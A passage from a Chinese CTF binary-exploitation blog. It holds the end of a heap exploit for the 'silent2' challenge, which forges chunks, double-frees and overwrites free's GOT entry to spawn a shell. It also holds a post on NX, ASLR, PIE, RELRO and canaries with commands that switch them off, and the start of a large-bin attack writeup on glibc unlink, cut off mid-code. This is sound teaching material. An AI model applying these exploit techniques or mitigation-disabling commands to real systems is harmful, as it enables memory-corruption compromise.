class="line">free_got_plt = <span class="number">0x602018</span></span><br><span class="line">p_addr = <span class="number">0x6020D8</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'CCCC'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'DDDD'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'EEEEE'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(p_addr - <span class="number">0x18</span>) + p64(p_addr - <span class="number">0x10</span>) + <span class="string">'A'</span> * (<span class="number">0x100</span> - <span class="number">0x20</span>) + p64(<span class="number">0x100</span>) + p64(</span><br><span class="line">    <span class="number">0x210</span> - <span class="number">0x100</span>) <span class="comment"># 构造两个chunk，绕过unlink的检查</span></span><br><span class="line">create(<span class="number">0x210</span>, payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># double free</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">modify(<span class="number">3</span>, p64(free_got_plt)[<span class="number">0</span>:<span class="number">4</span>], <span class="string">'1111'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">modify(<span class="number">0</span>, p64(func_addr)[<span class="number">0</span>:<span class="number">6</span>], <span class="string">'2222'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="调试中遇到的问题"><a href="#调试中遇到的问题" class="headerlink" title="调试中遇到的问题"></a>调试中遇到的问题</h2><p>gdb attach太早，结果调试cat进程去了。<br>gdb里设置跟随父进程，就可以断下来了。<br><code>set follow-fork-mode parent</code></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>wp是根据po师傅的exp写的QVQ，还有Reshahar师傅教我为什么断不下来……感谢。</p><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/silent2" target="_blank" rel="noopener">题目链接</a>和<a href="https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/silent2.i64" target="_blank" rel="noopener">我的i64文件</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> overlap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ctf pwn中的缓解机制及其原理</title>
      <link href="/2018/03/25/aslr/"/>
      <url>/2018/03/25/aslr/</url>
      <content type="html"><![CDATA[<h2 id="不可执行位-NX-Bit"><a href="#不可执行位-NX-Bit" class="headerlink" title="不可执行位 NX Bit"></a>不可执行位 NX Bit</h2><p>NX(Non-eXecute)位是一种针对 shellcode 执行攻击的保护措施, 意在更有效地识别数据区和代码区。该技术在 1997 年时被首次提出, 2004 年之后广泛应用于 Linux 与 Windows 操作系统上。众所周知, CPU 无法识别内存中的“数据”是指令还是用户数据, 如果 CPU 的 EIP 指向了攻击者控制的区域, 攻击者可以在此部署自己的 shellcode 从而控制程序的行为。而 NX 技术旨在更好地区分“数据”和“代码”.<br><strong>通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃。</strong><br>在Linux 中, <strong>当装载器把程序装载进内存空间后, 将程序的.text 段标记为可执行, 而其余的数据段(.data, .bss 等)以及栈、堆均不可执行</strong>。如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃。<br>但是我们可以注意到, 尽管攻击者无法通过代码注入攻击进行利用, 其仍然无法阻止攻击者通过<strong>控制函数指针来劫持控制流的方法</strong>。而攻击者可以使用流行的代码重用攻击, 使用现有代码来进一步构造自身所需控制流, 进而完成利用。</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br><code>gcc -z execstack -o test test.c</code></p><h2 id="地址空间布局随机化ASLR"><a href="#地址空间布局随机化ASLR" class="headerlink" title="地址空间布局随机化ASLR"></a>地址空间布局随机化ASLR</h2><p>ASLR(Address Space Layout Randomization,  地址空间布局随机化)技术意在将程序的内存布局随机化, 使得攻击者不能轻易地得到数据区的地址来构造攻击载荷。<strong>由于程序的堆、栈分配与共享库的装载都是在运行时进行, 系统在程序每次执行时, 随机地分配程序堆栈的地址以及共享库装载的地址。尽管它们之间的相对位置没有改变, 但每次执行的差异仍然是页级的, 攻击者将无法预测自己写入的数据区的确切虚拟地址。</strong><br>在 32 位系统中由于随机化的位数较少, 一个常用的绕过手段是通过枚举的方式, 猜测相关代码或者数据的位置, 并通过多次发送攻击载荷来不断触发程序运行。而在 64 位系统中, 因随机化位数较多, 使得通过枚举方式来猜测攻击的手段亦不可行。<br>但由于目前广泛应用在操作系统的地址随机化多为粗粒度的实现方式, 同一模块中的所有代码与数据的相对偏移固定。<strong>攻击者只需要通过信息泄露漏洞将某个模块中的任一代码指针或者数据指针泄露, 即可通过计算得出此模块中任意代码或者数据的地址。</strong><br>内存地址随机化机制（address space layout randomization)，有以下三种情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure></p><p>liunx下关闭ASLR的命令如下,root运行<br><code>sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><h2 id="位置无关可执行文件-PIE"><a href="#位置无关可执行文件-PIE" class="headerlink" title="位置无关可执行文件 PIE"></a>位置无关可执行文件 PIE</h2><p>PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,<strong>ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定</strong>。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写<br>GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。<br>使用 PIE 技术会很大程度上影响程序和系统的性能, 因此在 Linux 系统中, 除了关键的系统程序以及共享库使用了位置无关技术外, 大部分程序在编译时都直接确定各段加载的虚地址。</p><h2 id="重定位只读-RELRO"><a href="#重定位只读-RELRO" class="headerlink" title="重定位只读 RELRO"></a>重定位只读 RELRO</h2><p>RELRO(RELocation Read-Only, 重定位只读), 此项技术主要针对 GOT 改写的攻击方式。分为部分RELRO(Partial RELRO)与完全 RELRO(Full RELRO) 两种。    </p><ul><li>部分 RELRO: 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改。</li><li>完全 RELRO: 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址(二者都是程序动态装载的重要结构和函数)。</li></ul><p>可以看到, 当程序启用完全 RELRO 时,  传统的 GOT 劫持的方式也不再可用。但完全 RELRO 对程序性能的影响也相对较大, 因为其相当于禁用了用于性能优化的动态装载机制, 将程序中可能不会用到的一些动态符号装入, 当程序导入的外部符号很多时, 将带来一定程度的额外开销。</p><p>对于攻击者来说, 劫持程序本身 GOT 的利用方式仅仅是破坏函数指针中的一种, 由于系统库大多没有应用重定位只读技术, 结合之前的信息泄露技术, 劫持其他模块中的 GOT 与其他函数指针也是攻击者的手段之一。</p><h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。<strong>当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。</strong>攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6" target="_blank" rel="noopener">http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6</a></p><p><a href="http://jcs.iie.ac.cn/ch/reader/create_pdf.aspx?file_no=20180101&amp;year_id=2018&amp;quarter_id=1&amp;falg=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/create_pdf.aspx?file_no=20180101&amp;year_id=2018&amp;quarter_id=1&amp;falg=1</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>large bins attack及lctf2017 2ez4u writeup</title>
      <link href="/2018/03/21/lctf2/"/>
      <url>/2018/03/21/lctf2/</url>
      <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="关于fd-nextsize和bk-nextsize"><a href="#关于fd-nextsize和bk-nextsize" class="headerlink" title="关于fd_nextsize和bk_nextsize"></a>关于fd_nextsize和bk_nextsize</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *s=<span class="built_in">malloc</span>(<span class="number">1008</span>);<span class="comment">//分配large bin的大小</span></span><br><span class="line">    <span class="keyword">char</span> *s1=<span class="built_in">malloc</span>(<span class="number">1008</span>);</span><br><span class="line">    <span class="keyword">char</span> *s2=<span class="built_in">malloc</span>(<span class="number">960</span>);</span><br><span class="line">    <span class="keyword">char</span> *s3=<span class="built_in">malloc</span>(<span class="number">960</span>);</span><br><span class="line">    <span class="keyword">char</span> *s4=<span class="built_in">malloc</span>(<span class="number">980</span>);</span><br><span class="line">    <span class="keyword">char</span> *s5=<span class="built_in">malloc</span>(<span class="number">980</span>);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="built_in">free</span>(s4);</span><br><span class="line">    <span class="keyword">char</span> *s6=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">2000</span>);unsorted bins里找</span><br><span class="line">    s6=<span class="string">"hello,world"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,s6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译：<code>gcc -m32 fenpei.c -g -o  fenpei</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b <span class="number">14</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x804850a</span>: file fenpei.c, line <span class="number">14.</span></span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/sakura/fenpei </span><br><span class="line">...</span><br><span class="line"><span class="number">14</span>    <span class="keyword">char</span> *s6=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x10</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x18</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x28</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x38</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x804bf80</span> —▸ <span class="number">0x804b7f0</span> —▸ <span class="number">0x804b000</span> ◂— <span class="number">0xf7fbd450</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></p><p>注意当14行，这条语句运行前，还没有large bins，因为会先把free的chunk加入unsorted bins，然后当再次分配时，遍历unsorted，如果没有才把free的chunk加入到其该去的bins（这里就是large bins)。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line"><span class="number">15</span>    s6=<span class="string">"hello,world"</span>;</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x10</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x18</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x28</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x38</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x3c0</span>: <span class="number">0x804b000</span> —▸ <span class="number">0x804bf80</span> —▸ <span class="number">0x804b7f0</span> ◂— <span class="number">0xf7fbd680</span></span><br><span class="line"><span class="number">0x804b000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1017</span>, </span><br><span class="line">  fd = <span class="number">0x804bf80</span>, </span><br><span class="line">  bk = <span class="number">0xf7fbd680</span> &lt;main_arena+<span class="number">608</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x804bf80</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804b7f0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">0x804bf80</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">985</span>, </span><br><span class="line">  fd = <span class="number">0x804b7f0</span>, </span><br><span class="line">  bk = <span class="number">0x804b000</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x804b7f0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804b000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">0x804b7f0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">969</span>, </span><br><span class="line">  fd = <span class="number">0xf7fbd680</span> &lt;main_arena+<span class="number">608</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x804bf80</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x804b000</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804bf80</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>结论：</p><ul><li>large bin里的chunk是按照从大到小排序的。</li><li>若chunk在large bin的末端，则其的fd_nextsize指向首部，也就是最大的chunk，否则，fd_nextsize指向的是比它小的chunk.</li><li>若chunk在large bin的首部，则其的bk_nextsize指向末端，也就是最小的chunk，否则,bk_nextsize指向的是比它大的chunk.</li></ul><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-162936.jpg" alt=""><br>图中A1、B1、C1大小相同，是同一组chunk，A2是第二组，A3、B3大小相同，是第三组chunk。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line">  FD = P-&gt;fd;                                                          \</span><br><span class="line">  BK = P-&gt;bk;                                                          \</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); \</span><br><span class="line">  <span class="keyword">else</span> &#123;                                                               \</span><br><span class="line">    FD-&gt;bk = BK;                                                       \</span><br><span class="line">    BK-&gt;fd = FD;                                                       \</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)       \</span><br><span class="line">&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; \</span><br><span class="line">      assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);       \</span><br><span class="line">      assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);       \</span><br><span class="line">      <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;       \</span><br><span class="line"><span class="keyword">if</span> (P-&gt;fd_nextsize == P)       \</span><br><span class="line">  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;       \</span><br><span class="line"><span class="keyword">else</span> &#123;       \</span><br><span class="line">  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;       \</span><br><span class="line">  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;       \</span><br><span class="line">  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;       \</span><br><span class="line">  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;       \</span><br><span class="line">&#125;       \</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;       \</span><br><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;       \</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;       \</span><br><span class="line">      &#125;       \</span><br><span class="line">    &#125;       \</span><br><span class="line">  &#125;                                                                    \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>large bins中的空闲chunk可能处于两个双向循环链表中，unlink时需要从两个链表中都删除，这里只分析large bin特有的删除操作，其他的参考我的<a href="http://eternalsakura13.com/2018/03/01/unlink1/">另一篇文章</a></p><ul><li>if (!in_smallbin_range (P-&gt;size)                       \<br>  &amp;&amp; <strong>builtin_expect (P-&gt;fd_nextsize != NULL, 0)) </strong>builtin_expect((x),0)表示 x 的值为假的可能性更大，这是一个用于分值预测的命令，我们只要看里面的P-&gt;fd_nextsize != NULL即可。<br>只有当chunk为large bin且P-&gt;fd_nextsize != NULL 时才需要修改,即chunk是同组的第一个空闲chunk。</li><li>assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);               \<br> assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);<br> 这里进行两个检查。</li><li>根据具体情况适当设置fd_nextsize和bk_nextsize</li></ul><p>第一种：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">else</span> &#123;       \</span><br><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;       \</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;       \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即如果FD-&gt;fd_nextsize != NULL，说明FD是下一组尺寸相同的chunks的第一个chunk。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-163704.jpg" alt=""><br>图示我要移除的P为A2，则FD是A3，FD的fd_nextsize!=NULL</p><p>P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-163854.jpg" alt=""><br>P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-164010.jpg" alt=""><br>第二种：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;       \</span><br><span class="line"><span class="keyword">if</span> (P-&gt;fd_nextsize == P)       \</span><br><span class="line">  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br></pre></td></tr></table></figure></p><p>如果FD-&gt;fd_nextsize == NULL，且P是仅有的唯一一组尺寸相同的 chunks的第一个chunk。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-21-021545.jpg" alt=""><br>图示的chunk大小都相同，若P为A1，FD即B1。<br>则此时P-&gt;fd_nextsize仍为P，移除P后，FD就是第一个chunk，所以将FD的fd_nextsize和bk_nextsize都由NULL修改为指向它自己。</p><p>第三种：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)       \</span><br><span class="line">&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; \</span><br><span class="line">      ...       \</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;       \</span><br><span class="line">  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;       \</span><br><span class="line">  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;       \</span><br><span class="line">  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;       \</span><br><span class="line">  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;       \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有多组chunks,且P为同组chunks的第一个chunk，且FD不是下一组尺寸相同的chunks的第一个chunk。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-164526.jpg" alt=""><br>图示要移除的P为A2，则FD为B2。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure></p><p><strong>FD继承P的fd_nextsize和bk_nextsize</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-164943.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br></pre></td></tr></table></figure></p><p><strong>修改P-&gt;fd_nextsize和P-&gt;bk_nextsize的指针</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-165417.jpg" alt=""></p><h3 id="large-bin的分配"><a href="#large-bin的分配" class="headerlink" title="large bin的分配"></a>large bin的分配</h3><p>下述内容来源《glibc内存管理ptmalloc源代码分析》p87及glibc2.12.1源码</p><p>这里略去之前fastbins的合并和对unsorted的检索。<br>当这些都不能分配合适的chunk的时候，就到了下面的large bin分配实现。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">      sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">      bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果所需分配的chunk为large bin chunk，查询对应的large bin链表，</span></span><br><span class="line"><span class="comment">      如果large bin链表为空，或者链表中最大的chunk(即first(bin)，large 